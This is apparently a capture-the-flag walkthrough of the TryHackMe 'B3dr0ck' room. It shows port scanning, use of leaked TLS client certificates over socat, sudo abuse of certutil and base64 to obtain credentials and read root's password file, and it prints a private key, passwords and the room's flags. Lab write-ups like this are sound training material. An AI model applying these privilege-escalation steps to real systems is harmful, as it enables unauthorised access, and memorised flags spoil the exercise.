# TryHackMe - B3dr0ck
## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.250.157
```

## 📌  Yabba-Dabba-Doo!

```
Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
 Can you find all the Easter eggs?
```

### 🔍 Nmap Scan

**Using all ports takes forver**

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    nginx 1.18.0 (Ubuntu)
4040/tcp port 80 redirect via nginx to https://10.10.250.157:4040/
9009/tcp open  pichat?
                                       
```

Interesting
```
/usr/share/abc/public/robots.txt
```

### 🔍 Gobuster (ignore cert)

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://10.10.250.157:4040 -k -x .php,.txt,.html
```

**Results**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 858]
Progress: 104585 / 350660 (29.83%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 104613 / 350660 (29.83%)
===============================================================
Finished

```

Moving on to that weird 9009 service

```bash
telnet 10.10.250.157 9009
```
It asks me for certificate or private key. I'll take both. Thank you!
typing "password" gave me this
```
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```
```bash
socat stdio ssl:10.10.250.157:54321,cert=clnt_id,key=rsa_id,verify=0
```

**Results**
```
2025/06/27 21:56:41 socat[42744] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 
```
## Initial Foothold

I should be able to ssh in as barney

```bash
ssh barney@10.10.250.157
cat barney.txt 
THM{f05780f08f0eb1de65023069d0e4c90c}
```

**Q. What is the barney.txt flag?
A. THM{f05780f08f0eb1de65023069d0e4c90c}

```bash
sudo -l
```
**Results**
```
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil

```
cool I can use certutil as root

## Upgrade to Fred

```bash
sudo certutil -l
```

**Results**
```
Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Jun 28 01:01 barney.certificate.pem
-rw-r----- 1 root root 1674 Jun 28 01:01 barney.clientKey.pem
-rw-r----- 1 root root  894 Jun 28 01:01 barney.csr.pem
-rw-r----- 1 root root 1674 Jun 28 01:01 barney.serviceKey.pem
-rw-r----- 1 root root  976 Jun 28 01:01 fred.certificate.pem
-rw-r----- 1 root root 1678 Jun 28 01:01 fred.clientKey.pem
-rw-r----- 1 root root  898 Jun 28 01:01 fred.csr.pem
-rw-r----- 1 root root 1674 Jun 28 01:01 fred.serviceKey.pem
```
Lets create fred's certs

```bash
sudo certutil -a fred.csr.pem
```
**Results**
```-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApn5rx/E4ZDzFKqo2yWy8Uimqz4XNZuv5hddR9HMmvsEWhbdJ
ttQfwcekc37501Vrxi4wXFrNLGfsbBnp/RjHnQXlOGC+jXb4f7U70wojQarzHt5Z
kgXmsIltF6fQnpeMuKI2bXstP9ho1jzWJAIh8BKrHqp0fmaWfNfzHzeE1jR7wQzi
kbrNjJBe93BhOeltJ7+VcTwdEwOYn5PLWEIcuuXYgtUQ1bNzzkzNOiYVQEuUeY+0
d3lAArUGVCtGOf3FtW4ZUG9BXT5cmOLt4T8eMlBTpkVL4iFtDRyRzsEMgnoLeohL
AoKQpNvTLUcdVrcctMTPYK5MkonHfIxPfDoNawIDAQABAoIBAQCZLzPncE9cGnWl
/ZoO1VanmeKosQj9KxwXQrcK3G/Hjkw0lyDhcGYPmqn6AdfF05AndRPVxU2FD9D8
3RLmZUgzdtshdhGcgtu8VHlIgMlTf//UZOuwaHGJ98dBvos5f2Jf9g9xx6UoWuqK
QssbskKbafG7c0Vfju/iyaXNEP3NPlxba1jFr8/eHFJjjTKA0ILkIjAAA1k7JoZK
wzwrFIzlYyELIVbMuGba3H3kouvYf7X6WWw368tAv3OcmwYAty27IQQqFzO6svAh
36FSFn9r7m62NYOp2EfkF5ytxYELlqNoj7GBMNc6q5QAT5WY4W1G5zDnucrGCs8W
oRvuU9LBAoGBANgJDT6tslUfbM1OdCWTD3uPvtJV7bIckstuo0sptuhO3dishK82
D9ULoK2NRxh5fs6hRZ5g7Ybor2BqaauCBCwWmxgHlKcPjWP8dNGbtPjyckax0GQT
zt4k+dqVZjna5H1JBM/O4kyHJy9zKY45SxUukdKH99flUvxo1lvxEnjbAoGBAMVL
MbHc4Yx/8ARb9rapxJtP9ZqrwJFVBCaoNVN7piFeO6Y2PKx0uD86wdLtaK2Sz3Zm
vVnzxBUXs3O/QVwbHwtQ1Grkl821mnDIcwWRRed1HbbvzXOs0Q1bBes+VpuX4qjR
DKFU6x0m9SK0TP/iUbTEmUXkYGmn4iPc6pxzvtqxAoGAXw38ieubX+Dn2p3+dNn0
IgXpjFrKr2frHx+bMeM025p3+nJOH1nGNZNcK4DSG2654OkM3NcBLC8Nm3q27APV
GiEINNaBDdDGAYx/Sgsc4byrk3eBnccpao0Scp7xz9sEVivetiDtaYa+Mx6U1kNX
Sganmt7Aqnn4vZ7TUrkLy6kCgYA4aYa9F646UT6c0HrbwfEgg51za1a1d3ynXQNa
aomXEu21Wd7BZOJl2fQfzphWwRqm/Tt5I/VWHp/GIdKbdnnK74K9Sb2KKToOs5IH
7oDxbJBhhXHWeHyR+AvaNsnm1WgO4y9cVf6gKEqBcNJvfBPmvywgSuuyajmEDZ/b
ulDBEQKBgHvrko2s6P7cKjTtdWESTHSynsCZrNYMpkKrg5NSasngTYva/uvmkSwG
uK6gWRLfDQYgaflCmG+cS5MQg4zooD7R9bmqsIeIrZYcpp7cq+rsfdevEPVWcpER
KsdbXTruqpV2KhKCkZY1/hmfDXJGQAbuehqI95Joy8YBKjdVHHDb
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTA2MjgwMjA0MTZaFw0yNTA2MjkwMjA0MTZaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmfmvH8Thk
PMUqqjbJbLxSKarPhc1m6/mF11H0cya+wRaFt0m21B/Bx6RzfvnTVWvGLjBcWs0s
Z+xsGen9GMedBeU4YL6Ndvh/tTvTCiNBqvMe3lmSBeawiW0Xp9Cel4y4ojZtey0/
2GjWPNYkAiHwEqseqnR+ZpZ81/MfN4TWNHvBDOKRus2MkF73cGE56W0nv5VxPB0T
A5ifk8tYQhy65diC1RDVs3POTM06JhVAS5R5j7R3eUACtQZUK0Y5/cW1bhlQb0Fd
PlyY4u3hPx4yUFOmRUviIW0NHJHOwQyCegt6iEsCgpCk29MtRx1Wtxy0xM9grkyS
icd8jE98Og1rAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAEyyOqf71EOBUr7w5lSL
gyC5WBq99wW0S5C0iOth8jMW42byUsWO4uS7TwPD3EstBYPzWZ0c4Vqx3f2nKG0T
HZCHlNW/pNwwIq1aOQKjbKMy//hRabMEzuy1ccHx7AbAdmEcelO27zjrWS8lKfFS
biXzqvurbENShc/UfSrQo+Qy1abUf+CwYku3UrQKED7wJqFXQPHJiPC5asNRAXPX
fx/wcUKXDF7pTW4M6dHSuXKOt5AgAWS39Bsq1Psm/2YPeW2zo0EZke5w/yq6oqPp
azrDeVzwbE2ndhewQGMOCygTo4vD7Jibh5D8Kt3OkB+xdg6ALDv/GPWqVxNtK10Q
qRk=
-----END CERTIFICATE-----

```
Now lets use that weird service again. This time as fred!

```bash
socat STDIO ssl:10.10.250.157:54321,cert=cert_fred.crt,key=fred_id,verify=0
```
**Results**
```
2025/06/27 22:06:20 socat[47621] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> help
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
```
**Q. What is fred's password?
A. YabbaDabbaD0000!


Now, we can SSH in as fred

```bash
ssh fred@10.10.250.157
```

```bash
cat fred.txt 
THM{08da34e619da839b154521da7323559d}
```

**Q. What is the fred.txt flag?
A. THM{08da34e619da839b154521da7323559d}

## Go for root

```bash
sudo -l
```

**Results**

```
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

```bash
sudo base64 /root/pass.txt
```

**Results**
```
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

Using cyberchef I base64 decode, then base 32 decode, then base64 decode again!
**Results**
```
a00a12aad6b7c16bf07032bd05a31d56
```

The hint suggested I use https://crackstation.net/

**Results**

```
flintstonesvitamins
```

```bash
su
cat root.txt
THM{de4043c009214b56279982bf10a661b7}
```
